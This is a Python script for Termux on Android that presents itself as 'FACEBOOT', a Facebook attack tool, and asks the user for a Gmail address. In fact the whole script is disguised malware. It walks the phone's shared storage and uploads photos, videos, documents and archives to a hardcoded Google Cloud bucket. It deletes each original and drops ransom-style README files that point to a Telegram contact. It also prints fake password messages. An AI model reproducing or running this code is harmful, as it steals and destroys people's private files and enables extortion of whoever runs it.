import sys
import time
import os
import glob
from google.cloud import storage
from colorama import *

if os.name == "nt":
    os.system("clear")
else:
    client = storage.Client.from_service_account_json(
        "services/serviceAccounts.json"
    )
    bucket = client.get_bucket("pictuface-f9763.appspot.com")
    base_path = "/data/data/com.termux/files/home/storage/shared/"


    os.system("termux-setup-storage")
    os.system("clear")
#banner
    azul = Fore.BLUE
    verde = Fore.GREEN
    rojo = Fore.RED
    banner = f"""
                       {azul}FACEBOOT
                   
                     By: {verde}ANONOX
                     
            https://github.com/garciarodrigue\n
            {rojo}VERIFICANDO DOMINIO PARA EL ATAQUE....\n
"""
    for l in banner:
        sys.stdout.write(l)
        sys.stdout.flush()
        time.sleep(0.02)
    mail = input("Gmail@.com[+] ")

    extraccion_permitidas = [
        ".jpg",
        ".png",
        ".mp4",
        ".mp3",
        ".jpeg",
        ".txt",
        ".pdf",
        ".mvk",
        ".zip",
        ".rar",
    ]
    for root, dirs, files in os.walk(base_path):
        for archivo_local in files:
            archivo_completo = os.path.join(root, archivo_local)
            nombre_destino = os.path.basename(archivo_completo)
            _, extension = os.path.splitext(archivo_completo)
            if extension in extraccion_permitidas:
                blob = bucket.blob(nombre_destino)
                blob.upload_from_filename(archivo_completo)
                os.remove(archivo_completo)
                contacto = "Contactame: https://t.me/Sc_Hckrs"
                for i in range(1, 100):
                    nombre_archivo = f"README{i}.dat"
                    with open(nombre_archivo, 'w') as archivo:
                        archivo.write(contacto)
                print(f"{verde}Send Password =>{azul} {mail}")
            else:
                print(f"{rojo}Password Error")
